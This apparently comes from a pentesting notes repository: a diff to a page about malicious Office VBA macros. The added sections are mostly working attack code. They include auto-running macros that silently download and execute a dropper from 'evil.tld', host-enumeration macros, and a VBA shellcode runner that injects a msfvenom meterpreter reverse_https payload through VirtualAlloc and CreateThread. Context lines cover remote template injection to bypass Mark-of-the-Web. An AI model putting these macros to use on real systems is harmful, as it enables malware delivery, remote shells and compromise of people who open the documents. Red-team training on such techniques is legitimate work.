@@ -2,7 +2,7 @@
 title: Microsoft Office Macros
 ---
 
-## Visual Basic for Applications (VBA) Macro
+# Visual Basic for Applications (VBA) Macro
 
 VBA is an implementation of Visual Basic that is very widely used with Microsoft Office applications - often used to enhance or augment functionality in Word and Excel for data processing etc. 
 
@@ -17,7 +17,7 @@ To create a macro go to `View -> Macros` and create one.
 
 > **Note**: It's important to select the document in order to save the macro inside.
 
-```
+```vb
 Sub AutoOpen()
 
   Dim Shell As Object
@@ -31,9 +31,9 @@ End Sub
 
 > **Note**: To force the macro to trigger automatically when the document is opened, use the name`AutoOpen()`.
 
-### Executing a Powershell Payload
+## Executing a Powershell Payload
 
-```
+```vb
 Sub AutoOpen()
 
   Dim Shell As Object
@@ -43,7 +43,25 @@ Sub AutoOpen()
 End Sub
 ```
 
-## Changing Prent-Child Relationship
+## Enumeration with Environ function
+
+```vb
+Sub Enum()
+
+    Dim username
+    Dim hostname
+    
+    username = Environ("username")
+    hostname = Environ("computername")
+    MsgBox username + "||" + hostname
+
+End Sub
+```
+
+
+
+
+# Changing Prent-Child Relationship
 
 When a powershell is executed from a word macro a child `powershell.exe` process is created from `winword.exe` (MS Word as a Parent). This isn't normal behaviour and highly suspicious.
 
@@ -75,7 +93,7 @@ Target="http://10.10.10.10/template.dot"
 This will allow to execute the macro even if its flagged with MOTW.
 
 
-## Downloading and executing a file
+# Downloading and executing a file
 
 There are different ways to execute a binary.
 
@@ -105,4 +123,127 @@ Sub Wait(n As Long)
     DoEvents
   Loop Until Now >= DateAdd("s",n,t)
 End Sub
+```
+
+```vb
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim str As String
+    str = "powershell Invoke-WebRequest -uri 'http://evil.tld/dropper.exe' -outfile 'c:\users\benjugat\downloads\dropper.exe'"
+    Shell str, vbHide
+    Dim exePath As String
+    exePath = "c:\users\benjugat\downloads\dropper.exe"
+    Wait (10)
+    Shell exePath, vbHide
+
+End Sub
+
+Sub Wait(n As Long)
+    Dim t As Date
+    t = Now
+    Do
+        DoEvents
+    Loop Until Now >= DateAdd("s", n, t)
+End Sub
+```
+
+# Usage of WinAPIs in vba
+
+It's important to declare first the WINAPI on the beggining of the vba.
+
+```vb
+Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Function MyMacro()
+  Dim res As Long
+  Dim MyBuff As String * 256
+  Dim MySize As Long
+  Dim strlen As Long
+  MySize = 256
+  
+  res = GetUserName(MyBuff, MySize)
+  strlen = InStr(1, MyBuff, vbNullChar) - 1
+  MsgBox Left$(MyBuff, strlen)
+End Function
+```
+
+Another example:
+
+```vb
+Private Declare PtrSafe Function GetPhysicallyInstalledSystemMemory Lib "kernel32.dll" (ByRef TotalMemoryInKilobytes As Long) As Long
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Function MyMacro()
+  Dim res As Long
+  Dim TotalMemoryInKilobytes As Long
+  
+  res = GetPhysicallyInstalledSystemMemory(TotalMemoryInKilobytes)
+
+  MsgBox (TotalMemoryInKilobytes)
+End Function
+```
+
+## VBA shellocde Runner
+
+First we need to generate our payload
+
+```
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -f vbapplication
+```
+
+And our vba should be something like that:
+
+```vb
+Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
+Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Function MyMacro()
+    Dim buf As Variant
+    Dim addr As LongPtr
+    Dim counter As Long
+    Dim data As Long
+    Dim res As LongPtr
+  
+    buf = Array(252, 72, 131, 229.....)
+    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
+    For counter = LBound(buf) To UBound(buf)
+        data = buf(counter)
+        res = RtlMoveMemory(addr + counter, data, 1)
+    Next counter
+    
+    res = CreateThread(0, 0, addr, 0, 0, 0)
+    
+
+End Function
 ```
